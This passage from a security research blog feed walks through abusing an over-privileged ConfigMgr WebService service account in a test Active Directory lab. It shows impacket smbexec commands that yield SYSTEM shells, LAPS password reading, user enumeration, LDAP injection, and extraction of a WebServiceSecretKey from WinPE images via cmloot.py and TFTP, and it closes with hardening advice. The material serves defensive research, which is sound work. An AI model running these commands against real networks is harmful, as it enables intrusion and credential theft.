&lt;li&gt;&lt;a href=&#34;https://github.com/NickolajA/ConfigMgrWebService&#34;&gt;https://github.com/NickolajA/ConfigMgrWebService&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;img src=&#34;security-permissions-3.png&#34; alt=&#34;IT security permission&#34;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;As the recommended permissions sometimes contradict each other, and may be
quite limited in explanation, administrators may lack proper information
when delegating permissions and end up with an overly privileged service account.&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s highlight the risks of various permissions.&lt;/p&gt;
&lt;h2 id=&#34;exploitation&#34;&gt;Exploitation&lt;/h2&gt;
&lt;p&gt;To highlight some of the exploitation paths that can be used with the exposed
WebService, we&amp;rsquo;ve set up a test environment and misconfigured the service account
used by the WebService in various ways.&lt;/p&gt;
&lt;p&gt;Of course, setting up the service account as a member in &lt;code&gt;Domain Admins&lt;/code&gt; is probably
the worst scenario where exploitation by WebServices such as &lt;code&gt;AddADUserToGroup&lt;/code&gt; or
&lt;code&gt;AddADComputerToGroup&lt;/code&gt; should be apparent. While rare, configurations such as this are
encountered from time to time.&lt;/p&gt;
&lt;p&gt;To make it a bit more tricky, we&amp;rsquo;ve set up a slightly less obvious configuration where
the following setup of Organizational Units (OU) in the Active Directory is used, which
is not uncommon.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;active-directory-security-organizational-units.png&#34; alt=&#34;Active Directory security organizational units&#34;&gt;&lt;/p&gt;
&lt;p&gt;We&amp;rsquo;ve also added the permission of &lt;code&gt;Modify the membership of a group&lt;/code&gt; to the service
account to the root of the OU &lt;code&gt;CORP&lt;/code&gt;, in order for it to be able to make use of
some of the exposed WebServices.&lt;/p&gt;
&lt;h3 id=&#34;addadcomputertogroup&#34;&gt;AddADComputerToGroup&lt;/h3&gt;
&lt;p&gt;We will test out the first functionality of &lt;em&gt;ConfigMgr WebService&lt;/em&gt;. Namely
&lt;code&gt;AddADComputerToGroup&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;exploitation-of-active-directory-group-membership.png&#34; alt=&#34;Exploitation of Active Directory group membership&#34;&gt;&lt;/p&gt;
&lt;p&gt;What happened? Local administrator permissions on &lt;code&gt;DEMOMACHINE&lt;/code&gt; was given to
the computer &lt;code&gt;mylaptop&lt;/code&gt; via the custom group &lt;code&gt;Local Administrators - DEMOMACHINE&lt;/code&gt;
which was located in the OU structure.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ smbexec.py test.local/mylaptop&lt;span style=&#34;color:#ae81ff&#34;&gt;\$&lt;/span&gt;@DEMOMACHINE
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Impacket v0.12.0.dev1+20230907.33311.3f645107 - Copyright 2023 Fortra
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;Password:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[!] Launching semi-interactive shell - Careful what you execute
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;C:\Windows\system32&amp;gt;whoami
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nt authority\system
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;C:\Windows\system32&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Of course this is a fictitious setup however these types of unintended permissions
exist in most if not all Active Directory environment.&lt;/p&gt;
&lt;p&gt;This is caused by unintended
inheritance in Active Directory where the administrator gave the
&lt;em&gt;ConfigMgr WebService&lt;/em&gt; service account
&lt;code&gt;Modify the memership of a group&lt;/code&gt; to the root if the OU &lt;code&gt;CORP&lt;/code&gt;, which included
the group &lt;code&gt;Local Administrators - DEMOMACHINE&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;internal-network-security-for-active-directory.png&#34; alt=&#34;Internal network security for Active Directory&#34;&gt;&lt;/p&gt;
&lt;p&gt;To fix this careful planning of what OU&amp;rsquo;s the service account are allowed to modify
is required.&lt;/p&gt;
&lt;h3 id=&#34;getadcomputerattributevalue&#34;&gt;GetADComputerAttributeValue&lt;/h3&gt;
&lt;p&gt;So let&amp;rsquo;s explore how reading a computer attribute can be exploited to move laterally
or escalate privileges. One way would be if Local Administrator Password Solution
(LAPS) is misconfigured:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;gaining-laps-password-on-internal-pentest.png&#34; alt=&#34;Gaining LAPS password on internal pentest&#34;&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ smbexec.py administrator:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Mhr9;3KO5}X%6e&amp;#39;&lt;/span&gt;@SRV01
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Impacket v0.12.0.dev1+20230907.33311.3f645107 - Copyright 2023 Fortra
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;[!] Launching semi-interactive shell - Careful what you execute
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;C:\Windows\system32&amp;gt;whoami
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nt authority\system
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;C:\Windows\system32&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;addadusertogroup&#34;&gt;AddADUserToGroup&lt;/h3&gt;
&lt;p&gt;But what if LAPS is not misconfigured? Then misconfigure it by adding the service account
to the to the fictitious &lt;code&gt;LAPS Password readers&lt;/code&gt;-group using the handy AddADUserToGroup command:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;exploitation-of-laps-during-active-directory-security-assessment.png&#34; alt=&#34;Exploitation of LAPS during Active Directory security assessment&#34;&gt;&lt;/p&gt;
&lt;p&gt;Then fetch &lt;code&gt;ms-mcs-admpwd&lt;/code&gt; via &lt;code&gt;GetADComputerAttributeValue&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Would it also be possible to add a user to &lt;code&gt;Domain Admins&lt;/code&gt;? Of course, however this
requires the service account to have permission in either the domain-root or
in the &lt;code&gt;Users&lt;/code&gt; container.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;active-directory-security-ous.png&#34; alt=&#34;Active Directory security OU&amp;amp;rsquo;s&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;getaduserattributevalue&#34;&gt;GetADUserAttributeValue&lt;/h3&gt;
&lt;p&gt;Further on it is also possible to enumerate all computers and users with the &lt;code&gt;GetADUserAttributeValue&lt;/code&gt;-service
by inserting wildcard in LDAP queries.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;user-enumeration-active-directory.png&#34; alt=&#34;User enumeration Active Directory&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;user-enumeration-via-brute-force.png&#34; alt=&#34;User enumeration via brute force&#34;&gt;&lt;/p&gt;
&lt;p&gt;With a full user dump of Active Directory users, password spraying and AS-REP attacks are
possible attacks that could be used.&lt;/p&gt;
&lt;p&gt;Another classic is to enumerate the &lt;strong&gt;description&lt;/strong&gt; field of the Active Directory users,
where administrators sometimes put passwords:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;common-active-directory-security-vulnerability.png&#34; alt=&#34;Common Active Directory security vulnerability&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;setadcomputermanagedby&#34;&gt;SetADComputerManagedBy&lt;/h3&gt;
&lt;p&gt;The &lt;code&gt;ManagedBy&lt;/code&gt; Active Directory attribute should not be confused with the &lt;code&gt;Owner&lt;/code&gt;
attribute.
Being &lt;code&gt;Owner&lt;/code&gt; of a Active Directory computer object indirectly means administrator
access via the ShadowCredentials attack or Resource Based Constrained Delegation which
is not applicable in this case.
However &lt;code&gt;ManagedBy&lt;/code&gt; have two interesting aspects. If &lt;code&gt;ManagedBy&lt;/code&gt; is used on a
Active Directory group it is possible to allow the manager to modify membership.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;rodcs-security-misconfiguration.png&#34; alt=&#34;RODCs security misconfiguration&#34;&gt;&lt;/p&gt;
&lt;p&gt;Even though the &lt;a href=&#34;https://github.com/NickolajA/ConfigMgrWebService/blob/master/ConfigMgrWebService/ConfigMgrWebService.asmx.cs#L5835C63-L5835C111&#34;&gt;LDAP query&lt;/a&gt; used to lookup
the computer concatenates the user input into the query, basically meaning
LDAP injection.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;ldap-injection-vulnerability.png&#34; alt=&#34;LDAP injection vulnerability&#34;&gt;&lt;/p&gt;
&lt;p&gt;No ways of escaping the &lt;em&gt;objectClass=computer&lt;/em&gt; was found which
means that Active Directory groups cannot be modified with the
&lt;code&gt;SetADComputerManagedBy&lt;/code&gt; feature.&lt;/p&gt;
&lt;p&gt;The other interesting aspect is if the &lt;code&gt;ManagedBy&lt;/code&gt; attribute is used in conjunction
with Read-Only Domain Controllers (RODC).&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;remote-code-execution-on-active-directory-read-only-domain-controller.png&#34; alt=&#34;Remote code execution on Active Directory read-only domain controller&#34;&gt;&lt;/p&gt;
&lt;p&gt;The principal configured in the &lt;code&gt;ManagedBy&lt;/code&gt; attribute becomes the
&lt;a href=&#34;https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/73d11ea7-e634-453e-944d-559654cc91c5&#34;&gt;local administrator on the RODC&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;managedby2.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@adpen1:~$ smbexec.py test.local/test-lowpriv:&amp;#39;Flowahpowah1&amp;#39;@rodc01
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Impacket v0.12.0.dev1+20230907.33311.3f645107 - Copyright 2023 Fortra
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;[!] Launching semi-interactive shell - Careful what you execute
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;C:\Windows\system32&amp;gt;whoami
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nt authority\system
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;more-recon&#34;&gt;More recon&lt;/h2&gt;
&lt;p&gt;Until now all attacks originates from having PXE bootable network access with the
ability to boot a WinPE configured with &lt;em&gt;ConfigMgr OSD FrontEnd&lt;/em&gt;. This limitation
can be extended in three ways.&lt;/p&gt;
&lt;p&gt;In order to include &lt;em&gt;ConfigMgr OSD FrontEnd&lt;/em&gt; to a bootable WinPE the source files must
be injected to the image. In order for this to work Configuration Manager
requires &lt;em&gt;Source directory&lt;/em&gt; for the &lt;em&gt;ConfigMgr OSD FrontEnd&lt;/em&gt; files
to be imported via a UNC path:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;configuration-manager-security-share.png&#34; alt=&#34;Configuration Manager security share&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Everybody calm down, I&amp;rsquo;ve got this&lt;/em&gt; the administrator says, right-clicks the
folder, chooses share and done.&lt;/p&gt;
&lt;p&gt;What just happened is a very common issue in Windows corporate environments. As the
default permissions on a local folder outside of home folders for example, includes
&lt;code&gt;&amp;lt;computername&amp;gt;\Users&lt;/code&gt; with read permissions:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;active-directory-security-tab-on-share.png&#34; alt=&#34;Active Directory security tab on share&#34;&gt;&lt;/p&gt;
&lt;p&gt;Which via nesting includes &lt;code&gt;&amp;lt;domain&amp;gt;\Domain Users&lt;/code&gt;:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;internal-security-review-of-windows-users.png&#34; alt=&#34;Internal security review of Windows - Users&#34;&gt;&lt;/p&gt;
&lt;p&gt;Now every authenticated user in the domain has the permissions to access the secret
key in the &lt;code&gt;OSDFrontEnd.exe.config&lt;/code&gt; file.&lt;/p&gt;
&lt;h2 id=&#34;more-recon-2&#34;&gt;More recon #2&lt;/h2&gt;
&lt;p&gt;OK, so the &lt;code&gt;sources&lt;/code&gt; folder in the previous example is now properly secured and
no means of obtaining the &lt;code&gt;OSDFrontEnd.exe.config&lt;/code&gt; is possible. But wait&amp;hellip;&lt;/p&gt;
&lt;p&gt;We turn to our nifty tool &lt;a href=&#34;https://github.com/shelltrail/cmloot&#34;&gt;cmloot.py&lt;/a&gt;, to
index all files in the SCCM inventory:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@pentest:~$ cmloot.py test.local/test-lowpriv@sccm01 -cmlootinventory sccmfiles.txt
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Impacket v0.12.0.dev1+20231004.192432.3760dfc6 - Copyright 2023 Fortra
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;[+] Access to SCCMContentLib
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;[+] sccmfiles.txt created
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;user@pentest:~/cmloot$
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;As the WinPE&amp;rsquo;s are distributed to the Distribution Points running the Configuration
Manager PXE service it will be stored in the &lt;code&gt;SCCMContentLib$&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@adpen1:~$ cat sccmfiles.txt | grep &amp;#39;\.wim&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;\\sccm01\SCCMContentLib$\DataLib\XYZ00002.3\boot.XYZ00002.wim
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;\\sccm01\SCCMContentLib$\DataLib\XYZ00006.9\winpe_dotnet.XYZ00006.wim
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;\\sccm01\SCCMContentLib$\DataLib\XYZ00007.3\winpe.XYZ00007.wim
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;\\sccm01\SCCMContentLib$\DataLib\XYZ0000C.2\winpe.XYZ0000C.wim
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ cmloot.py test.local/test-lowpriv@sccm01 -n -cmlootdownload sccmfiles.txt -extensions wim
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Impacket v0.11.0 - Copyright 2023 Fortra
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;[+] Extensions to download [&amp;#39;wim&amp;#39;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[+] Downloaded 7E2C-boot.XYZ00002.wim
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[+] Downloaded 007F-winpe_dotnet.XYZ00006.wim
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[+] Downloaded 9599-winpe.XYZ00007.wim
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[+] Downloaded 4B5C-winpe.XYZ0000C.wim
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The &lt;code&gt;.wim&lt;/code&gt; files can easily be extracted with 7-zip:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@adpen1:~/CMLootOut$ 7z x 007F-winpe_dotnet.XYZ00006.wim
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs Intel(R) Core(TM) i7-8565U CPU @ 1.80GHz (806EC),ASM,AES-NI)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;Scanning the drive for archives:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1 file, 425193731 bytes (406 MiB)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;Extracting archive: 007F-winpe_dotnet.XYZ00006.wim
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;[...]
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;After this we just extract the key from the config-file.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@adpen1:~/CMLootOut$ cat sms/PKG/SMS10000/OSDFrontEnd.exe.config | grep SecretKey -A1
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &amp;lt;setting name=&amp;#34;WebServiceSecretKey&amp;#34; serializeAs=&amp;#34;String&amp;#34;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &amp;lt;value&amp;gt;134ef495-4991-41df-9fa3-27c1a736de85&amp;lt;/value&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;more-recon-3&#34;&gt;More recon #3&lt;/h2&gt;
&lt;p&gt;OK, so what if the administrator restricts permissions on the &lt;code&gt;SCCMContentLib$&lt;/code&gt;
(Actually don&amp;rsquo;t know if this is supported). No problem, you can download the &lt;code&gt;.wim&lt;/code&gt;
files directly from the Configuration Manager PXE server but only if Configuration i
Manager is using WDS for the PXE services.&lt;/p&gt;
&lt;p&gt;According to TFTP&amp;rsquo;s &lt;a href=&#34;https://www.rfc-editor.org/rfc/rfc1350&#34;&gt;RFC&lt;/a&gt; you cannot list
directories or files which means you need to guess the file names
for the &lt;code&gt;.wim&lt;/code&gt; files. Luckily, &lt;code&gt;cmloot.py&lt;/code&gt; did this for us in the previous example.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@adpen1:~$ cat sccmfiles.txt | grep -i winpe
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;\\sccm01\SCCMContentLib$\DataLib\XYZ00006.9\winpe_dotnet.XYZ00006.wim
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;\\sccm01\SCCMContentLib$\DataLib\XYZ00007.3\winpe.XYZ00007.wim
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@adpen1:~$ atftp 100.64.5.221 69 -l winpe_dotnet.XYZ00006.wim -g -r &amp;#39;SMSImages\\XYZ00006\\winpe_dotnet.XYZ00006.wim&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;user@adpen1:~$ file winpe_dotnet.XYZ00006.wim
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;winpe_dotnet.XYZ00006.wim: Windows imaging (WIM) image v1.13, bootable no. 1, LZX compressed, reparse point fixup
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;If the Configuration Manager PXE use &lt;code&gt;sccmpxe.exe&lt;/code&gt; as opposed to WDS PXE this does
not work as the WinPE file location is dynamically generated during the PXE process, and
does not rely on static paths.&lt;/p&gt;
&lt;h2 id=&#34;conclusions-and-recommendations&#34;&gt;Conclusions and Recommendations&lt;/h2&gt;
&lt;p&gt;As we&amp;rsquo;ve seen in this blog post there are several exploitation paths that could
be used by an attacker depending on how the service account is configured. We&amp;rsquo;ve also
seen that keeping the &lt;code&gt;WebServiceSecretKey&lt;/code&gt; can be a bit of a challenge if the
&lt;em&gt;ConfigMgr WebService&lt;/em&gt; is in use.&lt;/p&gt;
&lt;p&gt;As some of the methods to obtaining the &lt;code&gt;WebServiceSecretKey&lt;/code&gt; without being authenticated in the
Active Directory domain exist these can serve as an initial access vector on a internal network.&lt;/p&gt;
&lt;p&gt;To limit the exploitation it is recommended to use the principle of least privilege
on the service account, ensuring that the minimal permissions possible are given.&lt;/p&gt;
&lt;p&gt;A shortlist of what to avoid can be:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;To &lt;strong&gt;not&lt;/strong&gt; include the service account in highly privileged groups.&lt;/li&gt;
&lt;li&gt;To limit the ability for the service account to add users and computers to groups or modify objects other than a limited set of allowed entities.&lt;/li&gt;
&lt;li&gt;Limit the ability for the usage of SetADComputerManagedBy if RODCs are used in the environment.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;note-from-the-developer&#34;&gt;Note from the developer&lt;/h2&gt;
&lt;p&gt;&lt;em&gt;ConfigMgr WebService&lt;/em&gt; last release was back in 2019 and has since stopped developing. The
developer is considering the project legacy and recommends not to use it.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Introducing cmloot.py - New tooling for attacking Configuration Manager</title>
      <link>https://www.shelltrail.com/research/cmloot/</link>
      <pubDate>Sun, 24 Sep 2023 00:00:00 +0000</pubDate>
      
      <guid>https://www.shelltrail.com/research/cmloot/</guid>
      <description>&lt;h1 id=&#34;tldr&#34;&gt;TL;DR&lt;/h1&gt;
